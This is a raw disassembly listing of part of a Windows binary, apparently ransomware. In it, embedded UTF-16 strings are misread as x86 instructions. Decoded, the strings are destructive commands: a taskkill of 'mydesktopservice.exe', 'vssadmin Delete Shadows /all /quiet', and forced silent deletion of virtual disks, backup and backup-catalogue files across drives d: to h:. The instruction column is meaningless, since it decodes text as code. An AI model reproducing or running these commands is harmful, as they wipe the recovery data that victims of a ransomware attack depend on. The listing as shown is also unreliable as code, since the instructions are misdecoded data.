  4047e6:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4047ea:	00 2f                	add    %ch,(%edi)
  4047ec:	00 49 00             	add    %cl,0x0(%ecx)
  4047ef:	4d                   	dec    %ebp
  4047f0:	00 20                	add    %ah,(%eax)
  4047f2:	00 6d 00             	add    %ch,0x0(%ebp)
  4047f5:	79 00                	jns    0x4047f7
  4047f7:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4047fb:	73 00                	jae    0x4047fd
  4047fd:	6b 00 74             	imul   $0x74,(%eax),%eax
  404800:	00 6f 00             	add    %ch,0x0(%edi)
  404803:	70 00                	jo     0x404805
  404805:	73 00                	jae    0x404807
  404807:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40480b:	76 00                	jbe    0x40480d
  40480d:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  404813:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  404817:	78 00                	js     0x404819
  404819:	65 00 20             	add    %ah,%gs:(%eax)
  40481c:	00 2f                	add    %ch,(%edi)
  40481e:	00 46 00             	add    %al,0x0(%esi)
  404821:	00 7b 20             	add    %bh,0x20(%ebx)
  404824:	00 20                	add    %ah,(%eax)
  404826:	00 20                	add    %ah,(%eax)
  404828:	00 20                	add    %ah,(%eax)
  40482a:	00 20                	add    %ah,(%eax)
  40482c:	00 20                	add    %ah,(%eax)
  40482e:	00 20                	add    %ah,(%eax)
  404830:	00 20                	add    %ah,(%eax)
  404832:	00 20                	add    %ah,(%eax)
  404834:	00 20                	add    %ah,(%eax)
  404836:	00 20                	add    %ah,(%eax)
  404838:	00 20                	add    %ah,(%eax)
  40483a:	00 20                	add    %ah,(%eax)
  40483c:	00 20                	add    %ah,(%eax)
  40483e:	00 20                	add    %ah,(%eax)
  404840:	00 20                	add    %ah,(%eax)
  404842:	00 20                	add    %ah,(%eax)
  404844:	00 20                	add    %ah,(%eax)
  404846:	00 20                	add    %ah,(%eax)
  404848:	00 20                	add    %ah,(%eax)
  40484a:	00 20                	add    %ah,(%eax)
  40484c:	00 20                	add    %ah,(%eax)
  40484e:	00 20                	add    %ah,(%eax)
  404850:	00 20                	add    %ah,(%eax)
  404852:	00 20                	add    %ah,(%eax)
  404854:	00 20                	add    %ah,(%eax)
  404856:	00 76 00             	add    %dh,0x0(%esi)
  404859:	73 00                	jae    0x40485b
  40485b:	73 00                	jae    0x40485d
  40485d:	61                   	popa
  40485e:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  404862:	00 69 00             	add    %ch,0x0(%ecx)
  404865:	6e                   	outsb  %ds:(%esi),(%dx)
  404866:	00 20                	add    %ah,(%eax)
  404868:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40486c:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  404870:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  404874:	00 20                	add    %ah,(%eax)
  404876:	00 53 00             	add    %dl,0x0(%ebx)
  404879:	68 00 61 00 64       	push   $0x64006100
  40487e:	00 6f 00             	add    %ch,0x0(%edi)
  404881:	77 00                	ja     0x404883
  404883:	73 00                	jae    0x404885
  404885:	20 00                	and    %al,(%eax)
  404887:	2f                   	das
  404888:	00 61 00             	add    %ah,0x0(%ecx)
  40488b:	6c                   	insb   (%dx),%es:(%edi)
  40488c:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  404890:	00 2f                	add    %ch,(%edi)
  404892:	00 71 00             	add    %dh,0x0(%ecx)
  404895:	75 00                	jne    0x404897
  404897:	69 00 65 00 74 00    	imul   $0x740065,(%eax),%eax
  40489d:	00 81 17 20 00 20    	add    %al,0x20002017(%ecx)
  4048a3:	00 20                	add    %ah,(%eax)
  4048a5:	00 20                	add    %ah,(%eax)
  4048a7:	00 20                	add    %ah,(%eax)
  4048a9:	00 20                	add    %ah,(%eax)
  4048ab:	00 20                	add    %ah,(%eax)
  4048ad:	00 20                	add    %ah,(%eax)
  4048af:	00 20                	add    %ah,(%eax)
  4048b1:	00 20                	add    %ah,(%eax)
  4048b3:	00 20                	add    %ah,(%eax)
  4048b5:	00 20                	add    %ah,(%eax)
  4048b7:	00 20                	add    %ah,(%eax)
  4048b9:	00 20                	add    %ah,(%eax)
  4048bb:	00 20                	add    %ah,(%eax)
  4048bd:	00 20                	add    %ah,(%eax)
  4048bf:	00 20                	add    %ah,(%eax)
  4048c1:	00 20                	add    %ah,(%eax)
  4048c3:	00 20                	add    %ah,(%eax)
  4048c5:	00 20                	add    %ah,(%eax)
  4048c7:	00 20                	add    %ah,(%eax)
  4048c9:	00 20                	add    %ah,(%eax)
  4048cb:	00 20                	add    %ah,(%eax)
  4048cd:	00 20                	add    %ah,(%eax)
  4048cf:	00 20                	add    %ah,(%eax)
  4048d1:	00 20                	add    %ah,(%eax)
  4048d3:	00 20                	add    %ah,(%eax)
  4048d5:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4048d9:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4048dd:	00 2f                	add    %ch,(%edi)
  4048df:	00 73 00             	add    %dh,0x0(%ebx)
  4048e2:	20 00                	and    %al,(%eax)
  4048e4:	2f                   	das
  4048e5:	00 66 00             	add    %ah,0x0(%esi)
  4048e8:	20 00                	and    %al,(%eax)
  4048ea:	2f                   	das
  4048eb:	00 71 00             	add    %dh,0x0(%ecx)
  4048ee:	20 00                	and    %al,(%eax)
  4048f0:	64 00 3a             	add    %bh,%fs:(%edx)
  4048f3:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  4048f7:	00 2e                	add    %ch,(%esi)
  4048f9:	00 56 00             	add    %dl,0x0(%esi)
  4048fc:	48                   	dec    %eax
  4048fd:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  404901:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  404905:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404909:	00 2e                	add    %ch,(%esi)
  40490b:	00 62 00             	add    %ah,0x0(%edx)
  40490e:	61                   	popa
  40490f:	00 63 00             	add    %ah,0x0(%ebx)
  404912:	20 00                	and    %al,(%eax)
  404914:	64 00 3a             	add    %bh,%fs:(%edx)
  404917:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  40491b:	00 2e                	add    %ch,(%esi)
  40491d:	00 62 00             	add    %ah,0x0(%edx)
  404920:	61                   	popa
  404921:	00 6b 00             	add    %ch,0x0(%ebx)
  404924:	20 00                	and    %al,(%eax)
  404926:	64 00 3a             	add    %bh,%fs:(%edx)
  404929:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  40492d:	00 2e                	add    %ch,(%esi)
  40492f:	00 77 00             	add    %dh,0x0(%edi)
  404932:	62 00                	bound  %eax,(%eax)
  404934:	63 00                	arpl   %eax,(%eax)
  404936:	61                   	popa
  404937:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40493b:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  40493f:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404943:	00 2e                	add    %ch,(%esi)
  404945:	00 62 00             	add    %ah,0x0(%edx)
  404948:	6b 00 66             	imul   $0x66,(%eax),%eax
  40494b:	00 20                	add    %ah,(%eax)
  40494d:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  404951:	00 5c 00 42          	add    %bl,0x42(%eax,%eax,1)
  404955:	00 61 00             	add    %ah,0x0(%ecx)
  404958:	63 00                	arpl   %eax,(%eax)
  40495a:	6b 00 75             	imul   $0x75,(%eax),%eax
  40495d:	00 70 00             	add    %dh,0x0(%eax)
  404960:	2a 00                	sub    (%eax),%al
  404962:	2e 00 2a             	add    %ch,%cs:(%edx)
  404965:	00 20                	add    %ah,(%eax)
  404967:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  40496b:	00 5c 00 62          	add    %bl,0x62(%eax,%eax,1)
  40496f:	00 61 00             	add    %ah,0x0(%ecx)
  404972:	63 00                	arpl   %eax,(%eax)
  404974:	6b 00 75             	imul   $0x75,(%eax),%eax
  404977:	00 70 00             	add    %dh,0x0(%eax)
  40497a:	2a 00                	sub    (%eax),%al
  40497c:	2e 00 2a             	add    %ch,%cs:(%edx)
  40497f:	00 20                	add    %ah,(%eax)
  404981:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  404985:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404989:	00 2e                	add    %ch,(%esi)
  40498b:	00 73 00             	add    %dh,0x0(%ebx)
  40498e:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  404993:	00 64 00 3a          	add    %ah,0x3a(%eax,%eax,1)
  404997:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  40499b:	00 2e                	add    %ch,(%esi)
  40499d:	00 77 00             	add    %dh,0x0(%edi)
  4049a0:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  4049a6:	64 00 3a             	add    %bh,%fs:(%edx)
  4049a9:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  4049ad:	00 2e                	add    %ch,(%esi)
  4049af:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  4049b3:	00 6b 00             	add    %ch,0x0(%ebx)
  4049b6:	00 81 17 20 00 20    	add    %al,0x20002017(%ecx)
  4049bc:	00 20                	add    %ah,(%eax)
  4049be:	00 20                	add    %ah,(%eax)
  4049c0:	00 20                	add    %ah,(%eax)
  4049c2:	00 20                	add    %ah,(%eax)
  4049c4:	00 20                	add    %ah,(%eax)
  4049c6:	00 20                	add    %ah,(%eax)
  4049c8:	00 20                	add    %ah,(%eax)
  4049ca:	00 20                	add    %ah,(%eax)
  4049cc:	00 20                	add    %ah,(%eax)
  4049ce:	00 20                	add    %ah,(%eax)
  4049d0:	00 20                	add    %ah,(%eax)
  4049d2:	00 20                	add    %ah,(%eax)
  4049d4:	00 20                	add    %ah,(%eax)
  4049d6:	00 20                	add    %ah,(%eax)
  4049d8:	00 20                	add    %ah,(%eax)
  4049da:	00 20                	add    %ah,(%eax)
  4049dc:	00 20                	add    %ah,(%eax)
  4049de:	00 20                	add    %ah,(%eax)
  4049e0:	00 20                	add    %ah,(%eax)
  4049e2:	00 20                	add    %ah,(%eax)
  4049e4:	00 20                	add    %ah,(%eax)
  4049e6:	00 20                	add    %ah,(%eax)
  4049e8:	00 20                	add    %ah,(%eax)
  4049ea:	00 20                	add    %ah,(%eax)
  4049ec:	00 20                	add    %ah,(%eax)
  4049ee:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4049f2:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4049f6:	00 2f                	add    %ch,(%edi)
  4049f8:	00 73 00             	add    %dh,0x0(%ebx)
  4049fb:	20 00                	and    %al,(%eax)
  4049fd:	2f                   	das
  4049fe:	00 66 00             	add    %ah,0x0(%esi)
  404a01:	20 00                	and    %al,(%eax)
  404a03:	2f                   	das
  404a04:	00 71 00             	add    %dh,0x0(%ecx)
  404a07:	20 00                	and    %al,(%eax)
  404a09:	65 00 3a             	add    %bh,%gs:(%edx)
  404a0c:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404a10:	00 2e                	add    %ch,(%esi)
  404a12:	00 56 00             	add    %dl,0x0(%esi)
  404a15:	48                   	dec    %eax
  404a16:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  404a1a:	00 65 00             	add    %ah,0x0(%ebp)
  404a1d:	3a 00                	cmp    (%eax),%al
  404a1f:	5c                   	pop    %esp
  404a20:	00 2a                	add    %ch,(%edx)
  404a22:	00 2e                	add    %ch,(%esi)
  404a24:	00 62 00             	add    %ah,0x0(%edx)
  404a27:	61                   	popa
  404a28:	00 63 00             	add    %ah,0x0(%ebx)
  404a2b:	20 00                	and    %al,(%eax)
  404a2d:	65 00 3a             	add    %bh,%gs:(%edx)
  404a30:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404a34:	00 2e                	add    %ch,(%esi)
  404a36:	00 62 00             	add    %ah,0x0(%edx)
  404a39:	61                   	popa
  404a3a:	00 6b 00             	add    %ch,0x0(%ebx)
  404a3d:	20 00                	and    %al,(%eax)
  404a3f:	65 00 3a             	add    %bh,%gs:(%edx)
  404a42:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404a46:	00 2e                	add    %ch,(%esi)
  404a48:	00 77 00             	add    %dh,0x0(%edi)
  404a4b:	62 00                	bound  %eax,(%eax)
  404a4d:	63 00                	arpl   %eax,(%eax)
  404a4f:	61                   	popa
  404a50:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  404a54:	00 65 00             	add    %ah,0x0(%ebp)
  404a57:	3a 00                	cmp    (%eax),%al
  404a59:	5c                   	pop    %esp
  404a5a:	00 2a                	add    %ch,(%edx)
  404a5c:	00 2e                	add    %ch,(%esi)
  404a5e:	00 62 00             	add    %ah,0x0(%edx)
  404a61:	6b 00 66             	imul   $0x66,(%eax),%eax
  404a64:	00 20                	add    %ah,(%eax)
  404a66:	00 65 00             	add    %ah,0x0(%ebp)
  404a69:	3a 00                	cmp    (%eax),%al
  404a6b:	5c                   	pop    %esp
  404a6c:	00 42 00             	add    %al,0x0(%edx)
  404a6f:	61                   	popa
  404a70:	00 63 00             	add    %ah,0x0(%ebx)
  404a73:	6b 00 75             	imul   $0x75,(%eax),%eax
  404a76:	00 70 00             	add    %dh,0x0(%eax)
  404a79:	2a 00                	sub    (%eax),%al
  404a7b:	2e 00 2a             	add    %ch,%cs:(%edx)
  404a7e:	00 20                	add    %ah,(%eax)
  404a80:	00 65 00             	add    %ah,0x0(%ebp)
  404a83:	3a 00                	cmp    (%eax),%al
  404a85:	5c                   	pop    %esp
  404a86:	00 62 00             	add    %ah,0x0(%edx)
  404a89:	61                   	popa
  404a8a:	00 63 00             	add    %ah,0x0(%ebx)
  404a8d:	6b 00 75             	imul   $0x75,(%eax),%eax
  404a90:	00 70 00             	add    %dh,0x0(%eax)
  404a93:	2a 00                	sub    (%eax),%al
  404a95:	2e 00 2a             	add    %ch,%cs:(%edx)
  404a98:	00 20                	add    %ah,(%eax)
  404a9a:	00 65 00             	add    %ah,0x0(%ebp)
  404a9d:	3a 00                	cmp    (%eax),%al
  404a9f:	5c                   	pop    %esp
  404aa0:	00 2a                	add    %ch,(%edx)
  404aa2:	00 2e                	add    %ch,(%esi)
  404aa4:	00 73 00             	add    %dh,0x0(%ebx)
  404aa7:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  404aac:	00 65 00             	add    %ah,0x0(%ebp)
  404aaf:	3a 00                	cmp    (%eax),%al
  404ab1:	5c                   	pop    %esp
  404ab2:	00 2a                	add    %ch,(%edx)
  404ab4:	00 2e                	add    %ch,(%esi)
  404ab6:	00 77 00             	add    %dh,0x0(%edi)
  404ab9:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  404abf:	65 00 3a             	add    %bh,%gs:(%edx)
  404ac2:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404ac6:	00 2e                	add    %ch,(%esi)
  404ac8:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  404acc:	00 6b 00             	add    %ch,0x0(%ebx)
  404acf:	00 81 17 20 00 20    	add    %al,0x20002017(%ecx)
  404ad5:	00 20                	add    %ah,(%eax)
  404ad7:	00 20                	add    %ah,(%eax)
  404ad9:	00 20                	add    %ah,(%eax)
  404adb:	00 20                	add    %ah,(%eax)
  404add:	00 20                	add    %ah,(%eax)
  404adf:	00 20                	add    %ah,(%eax)
  404ae1:	00 20                	add    %ah,(%eax)
  404ae3:	00 20                	add    %ah,(%eax)
  404ae5:	00 20                	add    %ah,(%eax)
  404ae7:	00 20                	add    %ah,(%eax)
  404ae9:	00 20                	add    %ah,(%eax)
  404aeb:	00 20                	add    %ah,(%eax)
  404aed:	00 20                	add    %ah,(%eax)
  404aef:	00 20                	add    %ah,(%eax)
  404af1:	00 20                	add    %ah,(%eax)
  404af3:	00 20                	add    %ah,(%eax)
  404af5:	00 20                	add    %ah,(%eax)
  404af7:	00 20                	add    %ah,(%eax)
  404af9:	00 20                	add    %ah,(%eax)
  404afb:	00 20                	add    %ah,(%eax)
  404afd:	00 20                	add    %ah,(%eax)
  404aff:	00 20                	add    %ah,(%eax)
  404b01:	00 20                	add    %ah,(%eax)
  404b03:	00 20                	add    %ah,(%eax)
  404b05:	00 20                	add    %ah,(%eax)
  404b07:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  404b0b:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  404b0f:	00 2f                	add    %ch,(%edi)
  404b11:	00 73 00             	add    %dh,0x0(%ebx)
  404b14:	20 00                	and    %al,(%eax)
  404b16:	2f                   	das
  404b17:	00 66 00             	add    %ah,0x0(%esi)
  404b1a:	20 00                	and    %al,(%eax)
  404b1c:	2f                   	das
  404b1d:	00 71 00             	add    %dh,0x0(%ecx)
  404b20:	20 00                	and    %al,(%eax)
  404b22:	66 00 3a             	data16 add %bh,(%edx)
  404b25:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404b29:	00 2e                	add    %ch,(%esi)
  404b2b:	00 56 00             	add    %dl,0x0(%esi)
  404b2e:	48                   	dec    %eax
  404b2f:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  404b33:	00 66 00             	add    %ah,0x0(%esi)
  404b36:	3a 00                	cmp    (%eax),%al
  404b38:	5c                   	pop    %esp
  404b39:	00 2a                	add    %ch,(%edx)
  404b3b:	00 2e                	add    %ch,(%esi)
  404b3d:	00 62 00             	add    %ah,0x0(%edx)
  404b40:	61                   	popa
  404b41:	00 63 00             	add    %ah,0x0(%ebx)
  404b44:	20 00                	and    %al,(%eax)
  404b46:	66 00 3a             	data16 add %bh,(%edx)
  404b49:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404b4d:	00 2e                	add    %ch,(%esi)
  404b4f:	00 62 00             	add    %ah,0x0(%edx)
  404b52:	61                   	popa
  404b53:	00 6b 00             	add    %ch,0x0(%ebx)
  404b56:	20 00                	and    %al,(%eax)
  404b58:	66 00 3a             	data16 add %bh,(%edx)
  404b5b:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404b5f:	00 2e                	add    %ch,(%esi)
  404b61:	00 77 00             	add    %dh,0x0(%edi)
  404b64:	62 00                	bound  %eax,(%eax)
  404b66:	63 00                	arpl   %eax,(%eax)
  404b68:	61                   	popa
  404b69:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  404b6d:	00 66 00             	add    %ah,0x0(%esi)
  404b70:	3a 00                	cmp    (%eax),%al
  404b72:	5c                   	pop    %esp
  404b73:	00 2a                	add    %ch,(%edx)
  404b75:	00 2e                	add    %ch,(%esi)
  404b77:	00 62 00             	add    %ah,0x0(%edx)
  404b7a:	6b 00 66             	imul   $0x66,(%eax),%eax
  404b7d:	00 20                	add    %ah,(%eax)
  404b7f:	00 66 00             	add    %ah,0x0(%esi)
  404b82:	3a 00                	cmp    (%eax),%al
  404b84:	5c                   	pop    %esp
  404b85:	00 42 00             	add    %al,0x0(%edx)
  404b88:	61                   	popa
  404b89:	00 63 00             	add    %ah,0x0(%ebx)
  404b8c:	6b 00 75             	imul   $0x75,(%eax),%eax
  404b8f:	00 70 00             	add    %dh,0x0(%eax)
  404b92:	2a 00                	sub    (%eax),%al
  404b94:	2e 00 2a             	add    %ch,%cs:(%edx)
  404b97:	00 20                	add    %ah,(%eax)
  404b99:	00 66 00             	add    %ah,0x0(%esi)
  404b9c:	3a 00                	cmp    (%eax),%al
  404b9e:	5c                   	pop    %esp
  404b9f:	00 62 00             	add    %ah,0x0(%edx)
  404ba2:	61                   	popa
  404ba3:	00 63 00             	add    %ah,0x0(%ebx)
  404ba6:	6b 00 75             	imul   $0x75,(%eax),%eax
  404ba9:	00 70 00             	add    %dh,0x0(%eax)
  404bac:	2a 00                	sub    (%eax),%al
  404bae:	2e 00 2a             	add    %ch,%cs:(%edx)
  404bb1:	00 20                	add    %ah,(%eax)
  404bb3:	00 66 00             	add    %ah,0x0(%esi)
  404bb6:	3a 00                	cmp    (%eax),%al
  404bb8:	5c                   	pop    %esp
  404bb9:	00 2a                	add    %ch,(%edx)
  404bbb:	00 2e                	add    %ch,(%esi)
  404bbd:	00 73 00             	add    %dh,0x0(%ebx)
  404bc0:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  404bc5:	00 66 00             	add    %ah,0x0(%esi)
  404bc8:	3a 00                	cmp    (%eax),%al
  404bca:	5c                   	pop    %esp
  404bcb:	00 2a                	add    %ch,(%edx)
  404bcd:	00 2e                	add    %ch,(%esi)
  404bcf:	00 77 00             	add    %dh,0x0(%edi)
  404bd2:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  404bd8:	66 00 3a             	data16 add %bh,(%edx)
  404bdb:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404bdf:	00 2e                	add    %ch,(%esi)
  404be1:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  404be5:	00 6b 00             	add    %ch,0x0(%ebx)
  404be8:	00 81 17 20 00 20    	add    %al,0x20002017(%ecx)
  404bee:	00 20                	add    %ah,(%eax)
  404bf0:	00 20                	add    %ah,(%eax)
  404bf2:	00 20                	add    %ah,(%eax)
  404bf4:	00 20                	add    %ah,(%eax)
  404bf6:	00 20                	add    %ah,(%eax)
  404bf8:	00 20                	add    %ah,(%eax)
  404bfa:	00 20                	add    %ah,(%eax)
  404bfc:	00 20                	add    %ah,(%eax)
  404bfe:	00 20                	add    %ah,(%eax)
  404c00:	00 20                	add    %ah,(%eax)
  404c02:	00 20                	add    %ah,(%eax)
  404c04:	00 20                	add    %ah,(%eax)
  404c06:	00 20                	add    %ah,(%eax)
  404c08:	00 20                	add    %ah,(%eax)
  404c0a:	00 20                	add    %ah,(%eax)
  404c0c:	00 20                	add    %ah,(%eax)
  404c0e:	00 20                	add    %ah,(%eax)
  404c10:	00 20                	add    %ah,(%eax)
  404c12:	00 20                	add    %ah,(%eax)
  404c14:	00 20                	add    %ah,(%eax)
  404c16:	00 20                	add    %ah,(%eax)
  404c18:	00 20                	add    %ah,(%eax)
  404c1a:	00 20                	add    %ah,(%eax)
  404c1c:	00 20                	add    %ah,(%eax)
  404c1e:	00 20                	add    %ah,(%eax)
  404c20:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  404c24:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  404c28:	00 2f                	add    %ch,(%edi)
  404c2a:	00 73 00             	add    %dh,0x0(%ebx)
  404c2d:	20 00                	and    %al,(%eax)
  404c2f:	2f                   	das
  404c30:	00 66 00             	add    %ah,0x0(%esi)
  404c33:	20 00                	and    %al,(%eax)
  404c35:	2f                   	das
  404c36:	00 71 00             	add    %dh,0x0(%ecx)
  404c39:	20 00                	and    %al,(%eax)
  404c3b:	67 00 3a             	add    %bh,(%bp,%si)
  404c3e:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404c42:	00 2e                	add    %ch,(%esi)
  404c44:	00 56 00             	add    %dl,0x0(%esi)
  404c47:	48                   	dec    %eax
  404c48:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  404c4c:	00 67 00             	add    %ah,0x0(%edi)
  404c4f:	3a 00                	cmp    (%eax),%al
  404c51:	5c                   	pop    %esp
  404c52:	00 2a                	add    %ch,(%edx)
  404c54:	00 2e                	add    %ch,(%esi)
  404c56:	00 62 00             	add    %ah,0x0(%edx)
  404c59:	61                   	popa
  404c5a:	00 63 00             	add    %ah,0x0(%ebx)
  404c5d:	20 00                	and    %al,(%eax)
  404c5f:	67 00 3a             	add    %bh,(%bp,%si)
  404c62:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404c66:	00 2e                	add    %ch,(%esi)
  404c68:	00 62 00             	add    %ah,0x0(%edx)
  404c6b:	61                   	popa
  404c6c:	00 6b 00             	add    %ch,0x0(%ebx)
  404c6f:	20 00                	and    %al,(%eax)
  404c71:	67 00 3a             	add    %bh,(%bp,%si)
  404c74:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404c78:	00 2e                	add    %ch,(%esi)
  404c7a:	00 77 00             	add    %dh,0x0(%edi)
  404c7d:	62 00                	bound  %eax,(%eax)
  404c7f:	63 00                	arpl   %eax,(%eax)
  404c81:	61                   	popa
  404c82:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  404c86:	00 67 00             	add    %ah,0x0(%edi)
  404c89:	3a 00                	cmp    (%eax),%al
  404c8b:	5c                   	pop    %esp
  404c8c:	00 2a                	add    %ch,(%edx)
  404c8e:	00 2e                	add    %ch,(%esi)
  404c90:	00 62 00             	add    %ah,0x0(%edx)
  404c93:	6b 00 66             	imul   $0x66,(%eax),%eax
  404c96:	00 20                	add    %ah,(%eax)
  404c98:	00 67 00             	add    %ah,0x0(%edi)
  404c9b:	3a 00                	cmp    (%eax),%al
  404c9d:	5c                   	pop    %esp
  404c9e:	00 42 00             	add    %al,0x0(%edx)
  404ca1:	61                   	popa
  404ca2:	00 63 00             	add    %ah,0x0(%ebx)
  404ca5:	6b 00 75             	imul   $0x75,(%eax),%eax
  404ca8:	00 70 00             	add    %dh,0x0(%eax)
  404cab:	2a 00                	sub    (%eax),%al
  404cad:	2e 00 2a             	add    %ch,%cs:(%edx)
  404cb0:	00 20                	add    %ah,(%eax)
  404cb2:	00 67 00             	add    %ah,0x0(%edi)
  404cb5:	3a 00                	cmp    (%eax),%al
  404cb7:	5c                   	pop    %esp
  404cb8:	00 62 00             	add    %ah,0x0(%edx)
  404cbb:	61                   	popa
  404cbc:	00 63 00             	add    %ah,0x0(%ebx)
  404cbf:	6b 00 75             	imul   $0x75,(%eax),%eax
  404cc2:	00 70 00             	add    %dh,0x0(%eax)
  404cc5:	2a 00                	sub    (%eax),%al
  404cc7:	2e 00 2a             	add    %ch,%cs:(%edx)
  404cca:	00 20                	add    %ah,(%eax)
  404ccc:	00 67 00             	add    %ah,0x0(%edi)
  404ccf:	3a 00                	cmp    (%eax),%al
  404cd1:	5c                   	pop    %esp
  404cd2:	00 2a                	add    %ch,(%edx)
  404cd4:	00 2e                	add    %ch,(%esi)
  404cd6:	00 73 00             	add    %dh,0x0(%ebx)
  404cd9:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  404cde:	00 67 00             	add    %ah,0x0(%edi)
  404ce1:	3a 00                	cmp    (%eax),%al
  404ce3:	5c                   	pop    %esp
  404ce4:	00 2a                	add    %ch,(%edx)
  404ce6:	00 2e                	add    %ch,(%esi)
  404ce8:	00 77 00             	add    %dh,0x0(%edi)
  404ceb:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  404cf1:	67 00 3a             	add    %bh,(%bp,%si)
  404cf4:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404cf8:	00 2e                	add    %ch,(%esi)
  404cfa:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  404cfe:	00 6b 00             	add    %ch,0x0(%ebx)
  404d01:	00 81 17 20 00 20    	add    %al,0x20002017(%ecx)
  404d07:	00 20                	add    %ah,(%eax)
  404d09:	00 20                	add    %ah,(%eax)
  404d0b:	00 20                	add    %ah,(%eax)
  404d0d:	00 20                	add    %ah,(%eax)
  404d0f:	00 20                	add    %ah,(%eax)
  404d11:	00 20                	add    %ah,(%eax)
  404d13:	00 20                	add    %ah,(%eax)
  404d15:	00 20                	add    %ah,(%eax)
  404d17:	00 20                	add    %ah,(%eax)
  404d19:	00 20                	add    %ah,(%eax)
  404d1b:	00 20                	add    %ah,(%eax)
  404d1d:	00 20                	add    %ah,(%eax)
  404d1f:	00 20                	add    %ah,(%eax)
  404d21:	00 20                	add    %ah,(%eax)
  404d23:	00 20                	add    %ah,(%eax)
  404d25:	00 20                	add    %ah,(%eax)
  404d27:	00 20                	add    %ah,(%eax)
  404d29:	00 20                	add    %ah,(%eax)
  404d2b:	00 20                	add    %ah,(%eax)
  404d2d:	00 20                	add    %ah,(%eax)
  404d2f:	00 20                	add    %ah,(%eax)
  404d31:	00 20                	add    %ah,(%eax)
  404d33:	00 20                	add    %ah,(%eax)
  404d35:	00 20                	add    %ah,(%eax)
  404d37:	00 20                	add    %ah,(%eax)
  404d39:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  404d3d:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  404d41:	00 2f                	add    %ch,(%edi)
  404d43:	00 73 00             	add    %dh,0x0(%ebx)
  404d46:	20 00                	and    %al,(%eax)
  404d48:	2f                   	das
  404d49:	00 66 00             	add    %ah,0x0(%esi)
  404d4c:	20 00                	and    %al,(%eax)
  404d4e:	2f                   	das
  404d4f:	00 71 00             	add    %dh,0x0(%ecx)
  404d52:	20 00                	and    %al,(%eax)
  404d54:	68 00 3a 00 5c       	push   $0x5c003a00
  404d59:	00 2a                	add    %ch,(%edx)
  404d5b:	00 2e                	add    %ch,(%esi)
  404d5d:	00 56 00             	add    %dl,0x0(%esi)
  404d60:	48                   	dec    %eax
  404d61:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  404d65:	00 68 00             	add    %ch,0x0(%eax)
  404d68:	3a 00                	cmp    (%eax),%al
  404d6a:	5c                   	pop    %esp
  404d6b:	00 2a                	add    %ch,(%edx)
  404d6d:	00 2e                	add    %ch,(%esi)
  404d6f:	00 62 00             	add    %ah,0x0(%edx)
  404d72:	61                   	popa
